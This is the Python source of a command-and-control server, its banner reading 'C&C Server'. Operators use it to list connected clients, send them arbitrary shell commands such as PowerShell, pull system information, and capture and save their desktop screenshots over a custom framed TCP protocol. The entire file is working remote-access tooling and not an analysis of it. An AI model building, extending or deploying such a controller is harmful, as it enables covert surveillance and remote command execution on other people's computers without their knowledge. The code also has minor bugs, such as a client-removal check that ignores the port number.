import socketserver
import threading
import re
import base64
from datetime import datetime

# SockerServer example used at https://docs.python.org/3/library/socketserver.html
# Threads is used to run multiple I/O-bound tasks simultaneously, here, requests

# Global list to track connected clients and their sockets
# Needs to be refactored, Explore the Reactor Pattern in the future
connected_clients = []

class ClientSocket:
    static_id = 0

    def __init__(self, socket, ip, port, id) :
        self.socket = socket
        self.ip = ip
        self.port = port
        self.id = id

    def __repr__(self) -> str:
        return (f'Client( {self.ip}@{self.port} - ID:{self.id})')
    
def remove_client(clients, ip, port):
    for client in clients:
        if client.ip == ip and client.port:
            clients.remove(client)
            break

# Override class socketserver.BaseRequestHandler : https://docs.python.org/3/library/socketserver.html#socketserver.BaseRequestHandler
class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
    """
    It is instantiated once per connection to the server, and must
    override the handle() method to implement communication to the client.
    """
    

    def setup(self) :
        print(f'\nNew client connection : {self.client_address}')
        ClientSocket.static_id += 1
        id = ClientSocket.static_id
        client = ClientSocket(self.request, self.client_address[0], self.client_address[1], id)
        connected_clients.append(client)
        # print(f'Threads alive : {threading.active_count()}') # Debug purpose

    def handle(self):
        if (self.client_address[0] not in WHITE_LIST) :
            print('IP not in the WhiteList')
            return
        
        HEADER_LENGTH = 4 # Header will always be 4 bytes long
        START_DELIMITER = '<ST>'
        END_DELIMITER = '<ND>'
        data_size = 0 # text is sent over 1024 bytes and images over multiple 8192 bytes long

        try :
            while True : # Keep the connection Open
                header = self.request.recv(HEADER_LENGTH).strip()
                data_size = int.from_bytes(header, 'little')

                # For screenshot
                if data_size == 8192: 
                    packet : str = self.request.recv(data_size - HEADER_LENGTH).strip().decode('utf-8')
                    start_deliminer = packet.startswith(START_DELIMITER) # True or False

                    if start_deliminer : # it's an Img
                        packet = packet.removeprefix(START_DELIMITER)
                        img = packet # Accumulates Base64

                        end_deliminer = False
                        while not end_deliminer :
                            header = self.request.recv(HEADER_LENGTH).strip()
                            data_size = int.from_bytes(header, 'little')
                            packet : str = self.request.recv(data_size - HEADER_LENGTH).strip().decode('utf-8')
                            
                            end_deliminer = packet.endswith(END_DELIMITER)
                            if end_deliminer :
                                packet = packet.removesuffix(END_DELIMITER)
                                break
                            img += packet

                            # b64_to_txt(img.encode('utf-8')) # DEBUG

                        path = './screenshots/SAVED.jpg'
                        with open(path, 'wb') as fs:
                            fs.write(base64.decodebytes(img.encode('utf-8')))
                            print(f'Screenshot saved to : {path}')

                else :
                    self.data = self.request.recv(data_size - HEADER_LENGTH).strip()
                    message = self.data.decode('utf-8')
                    print(f'{self.client_address} > ' + message)

                    # send alive ping back
                    if (message == 'First connection ping'):
                        self.request.sendall(b'Alive ping back received')
                
        except ConnectionAbortedError :
            print('Connection was aborted by the local system')
        except ConnectionResetError :
            pass # Connection was forcibly closed by the remote host
    

    def finish(self) :
        print(f'\nConnection closed for: {self.client_address}')
        remove_client(connected_clients, self.client_address[0], self.client_address[1])

    def get_screenshot(): # Refactor : Put the screenshot part here 
        pass

# The threaded version let multiple clients connect at the same time.
# They can both communicate in a continuous Stream
class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    """This server will handle each request in a new thread."""
    # This ensures that the server can be interrupted and shut down even if there are active client connections.
    daemon_threads = True
    

def read_white_list():
    with open('white_list.txt', 'r') as file:
        whitelist = {line.strip() for line in file if line.strip()}
    return whitelist


def central_commands():
    exit = False
    list_commands_available()

    try :
        while not exit:
            print('\nWaiting for a command, exit to close the server')
            msg = input('> ')

            if msg == 'exit':
                exit = True
                break
            
            menu_option = msg.split(' ')[0]
            if menu_option == 'help':
                list_commands_available()
            elif menu_option == 'list':
                list_clients()
            elif menu_option == 'send_echo':
                send_echo(msg)
            elif menu_option == 'get_SC':
                get_SC(msg)
            elif menu_option == 'shell':
                send_shell(msg)
            elif menu_option == 'info':
                get_info(msg)
            elif menu_option == '':
                pass
            else :
                print('Command not recognized')

    except KeyboardInterrupt:
        print('Central commands terminated')


def list_commands_available():
    print("""
Available Commands:
    help
        List all the commands available.

    list
        List clients connected to the server.
          
    info [clientID]
        Gives the client system infos. 
        example : > info 1

    send_echo [clientID] ["message"]
        Send an echo message to the specified client.
        example : > send_echo 1 "Test 1 2 3 Test"

    get_SC [clientID]
        Get a screenshot of the client desktop.
        example : > get_SC 1

    shell [clientID] [Shell Command]
        Send a shell command to the client and retrieve the result.
        example : > shell 1 powershell ls -n
    """)



def list_clients():
    if len(connected_clients) == 0: 
        print('No clients connected')
    else :
        for client in connected_clients:
            print(client)


# REFACTOR : Verify that the socket is not closed, share the method from client
def get_client(msg : str) :
    """ Return socket.socket object """
    
    id = int(msg.split(' ')[1])
    for client in connected_clients:
        if client.id == id:
            return client.socket
    
    print(f'ClientID - {id} is not is the list of connected client')
    return None


def get_info(msg):
    client_socket = get_client(msg)
    if client_socket :
        command = 'get_sys_infos'
        client_socket.sendall(command.encode('utf-8'))


def send_echo(msg: str) :
    client_socket = get_client(msg)
    
    if client_socket :
        echo_msg = msg.split('\"')[1].replace('\"', "")

        command = f"echo {echo_msg}"
        print(f'echo {echo_msg} sent')
        client_socket.sendall(command.encode('utf-8'))


def get_SC(msg: str):
    client_socket = get_client(msg)

    if client_socket:
        command = 'screenshot'
        client_socket.sendall(command.encode('utf-8'))


# Add more examples
# REFACTOR Do some verification on the user input
def send_shell(msg: str):
    """ Usage : shell 1 powershell ls -n"""

    client_socket = get_client(msg)
    if not client_socket :
        return
    
    command = re.split('\w+ \d+ ', msg)[1] # Do some join if there's more than 1 @
    print(f'Command : {command} sent')

    client_socket.sendall(command.encode('utf-8')) 
    # The Data back is caught by the open loop Handler

def b64_to_txt(b64 : bytes):
    with open('img_b64_server.txt', 'wb') as fs:
        fs.write(b64)

if __name__ == '__main__':
    HOST, PORT = 'localhost', 5000
    WHITE_LIST = read_white_list()
    
    try :
        with ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler) as server : 
            programm_name = f"""  
            _________    ____   _________     _________                                
            \_   ___ \  /  _ \  \_   ___ \   /   _____/ ______________  __ ___________ 
            /    \  \/  >  _ </\/    \  \/   \_____  \_/ __ \_  __ \  \/ // __ \_  __ \\
            \     \____/  <_\ \/\     \____  /        \  ___/|  | \/\   /\  ___/|  | \/
             \______  /\_____\ \ \______  / /_______  /\___  >__|    \_/  \___  >__|   
                    \/        \/        \/          \/     \/                 \/       
                                Hosting - {HOST}:{PORT}
            """
            print(programm_name)

            # Run the server in a separate thread to control it from the main thread
            server_thread = threading.Thread(target=server.serve_forever) # In a loop, Handling one request at a time until shutdown. (CTL+C) 
            server_thread.daemon = True
            server_thread.start()

            # Listen from incoming commands from the server operator
            central_commands()

            server.shutdown()
            server.server_close()

    except KeyboardInterrupt:
        print('Server terminated')
        server.shutdown()
        server.server_close()